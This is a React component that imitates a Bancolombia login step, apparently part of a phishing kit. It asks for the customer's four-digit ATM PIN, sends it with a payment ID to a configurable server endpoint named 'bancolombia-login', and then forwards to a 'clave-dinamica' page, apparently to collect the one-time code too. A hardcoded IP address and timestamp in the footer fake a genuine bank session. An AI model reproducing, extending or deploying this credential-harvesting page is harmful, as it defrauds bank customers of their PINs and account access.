import { useState, useEffect } from "react"
import { useNavigate, useLocation } from "react-router-dom"
import "./PasswordForm.css"
import NavBarBa from "../NavBarBa/NavBarBa"
import { BASE_URL } from "../../config"  // <-- Importar la URL base

function PasswordForm() {
  const [clave, setClave] = useState(["", "", "", ""])
  const [error, setError] = useState("")
  const navigate = useNavigate()
  const location = useLocation()
  const { pagoId } = location.state || {}

  useEffect(() => {
    if (!pagoId) {
      alert("No hay pago válido, vuelve al inicio")
      navigate("/")
    }
  }, [pagoId, navigate])

  const handleChange = (value, index) => {
    if (/^[0-9]?$/.test(value)) {
      const newClave = [...clave]
      newClave[index] = value
      setClave(newClave)
      setError("")

      if (value && index < 3) {
        document.getElementById(`digit-${index + 1}`).focus()
      }
    }
  }

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !clave[index] && index > 0) {
      document.getElementById(`digit-${index - 1}`).focus()
    }
  }

  const handleSubmit = async (e) => {
    e.preventDefault()

    if (clave.some((c) => c === "")) {
      setError("Por favor ingresa los 4 dígitos de tu clave")
      return
    }

    try {
      const resp = await fetch(`${BASE_URL}/bancolombia-login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          pagoId,
          clave: clave.join(""),
        }),
      })

      const data = await resp.json()
      if (data.ok) {
        navigate("/clave-dinamica", { state: { pagoId } })
      } else {
        setError("Error: " + data.error)
      }
    } catch (err) {
      console.error(err)
      setError("Error conectando con el servidor")
    }
  }

  return (
    <div className="banco-container">
      <NavBarBa />

      <div className="banco-box">
        <h2 className="banco-title">Clave principal</h2>
        <p className="banco-text">Es la misma que usas en el cajero automático</p>

        <form onSubmit={handleSubmit}>
          <div className="clave-inputs">
            {clave.map((c, i) => (
              <input
                key={i}
                id={`digit-${i}`}
                type="password"
                inputMode="numeric"
                pattern="\d*"
                maxLength="1"
                autoComplete="one-time-code"
                aria-label={`Dígito ${i + 1} de la clave`}
                value={c}
                onChange={(e) => handleChange(e.target.value, i)}
                onKeyDown={(e) => handleKeyDown(e, i)}
              />
            ))}
          </div>

          {error && <p className="error-msg">{error}</p>}

          <div className="form-actions">
            <button
              type="button"
              className="btn-volver"
              onClick={() => navigate(-1)}
            >
              Volver
            </button>
            <button type="submit" className="btn-continuar">
              Continuar
            </button>
          </div>
        </form>
      </div>

      <footer className="banco-footer">
        <p>
          Bancolombia{" "}
          <span className="vig">
            VIGILADO Superintendencia Financiera de Colombia
          </span>
        </p>
        <p>Dirección IP: 192.230.104.12</p>
        <p>Lunes, 18 de Agosto de 2025, 3:37 a.m.</p>
      </footer>
    </div>
  )
}

export default PasswordForm
